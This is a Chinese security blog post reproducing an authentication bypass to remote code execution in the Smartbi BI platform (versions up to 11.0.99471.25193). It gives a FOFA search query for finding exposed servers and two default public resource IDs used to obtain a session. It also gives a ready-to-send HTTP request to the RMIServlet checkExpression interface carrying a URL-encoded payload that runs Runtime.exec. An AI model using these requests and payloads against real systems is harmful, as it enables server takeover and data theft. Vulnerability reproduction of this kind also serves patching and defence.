---
title: "SmarBI最新权限绕过致RCE"
source: https://mrxn.net/jswz/smartbi-authcation-bypass-rce.html
asset_dir: assets/smarbi最新权限绕过致rce
---

# SmarBI最新权限绕过致RCE

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/20 23:29
- 1357浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

商业智能

BI

补丁

---

# 漏洞简介

SmartBi 是一款专业的企业级商业智能（BI）平台，致力于为用户提供高效、灵活的数据分析与可视化解决方案。它支持多源数据整合、自助式分析以及智能报表生成，帮助团队快速洞察业务趋势，赋能数据驱动的决策。Smartbi官方发布安全补丁修复了一处远程代码执行漏洞，该漏洞源于攻击者可通过默认资源ID[绕过身份验证获取权限](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)，配合后台接口实现[远程代码执行](https://mrxn.net/tag/rce)，可能导致服务器被完全控制、数据泄露或业务系统沦陷。

管理

# 影响版本

Smartbi <= 11.0.99471.25193

# fofa语法

> app="SMARTBI"

# 漏洞分析

参考里的漫漫安全路公众号，包括补丁解密分析，以及漏洞分析这里就不赘述了。

# 漏洞复现

# 权限绕过

深入探索

VPN服务

防火墙软件

漏洞修复方案

权限绕过主要是数据库存在两个默认的**publicshared**字段为1的，即可公开访问的资源ID。

漏洞预警服务

```
b904ab9f5a84712a672523a7b4881ee4
96a0a9d0b86f90d5416d013f4cfe2f23
```

[![SmarBI最新权限绕过致RCE](images/img-001-4fd861f4c5ce.webp)](https://image.mrxn.net/2e452261cd76441e905b61d7e623065b.webp)

[![SmarBI最新权限绕过致RCE](images/img-002-77558379d71f.webp)](https://image.mrxn.net/a3cc4ae4d41f482d9d419b3d329aca49.webp)

```
GET /smartbi/vision/share.jsp?resid=96a0a9d0b86f90d5416d013f4cfe2f23 HTTP/1.1
Host: smartbi.mrxn.net
```

获取一个合法session

数据管理

# 代码执行

然后访问后台的`RMIServlet`接口配合**MetricsModelForVModule**的**checkExpression**进行执行js表达式达到[代码执行](https://mrxn.net/tag/rce)的效果

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: smartbi.mrxn.net
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: FQConfigLogined=; JSESSIONID=yoursession

className=MetricsModelForVModule&methodName=checkExpression&params=%5b%22%76%61%72%20%70%20%3d%20%4a%61%76%61%2e%74%79%70%65%28%5c%22%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%5c%22%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%5c%22%63%61%6c%63%5c%22%29%3b%22%5d
```

[![SmarBI最新权限绕过致RCE](images/img-003-439587b62b30.webp)](https://image.mrxn.net/91f0ce5a09bd44a99e6ae273e43b6dc5.webp)

本地测试[执行](https://mrxn.net/tag/rce)成功，弹出计算器。

安全运维咨询

# 参考

- [Smartbi 最新认证绕过导致RCE漏洞分析](https://mp.weixin.qq.com/s/aIyGt5OKlYCL-NPfd0G2Jw)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.权限绕过](#toc-6-)
- [7.代码执行](#toc-7-)
- [8.参考](#toc-8-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
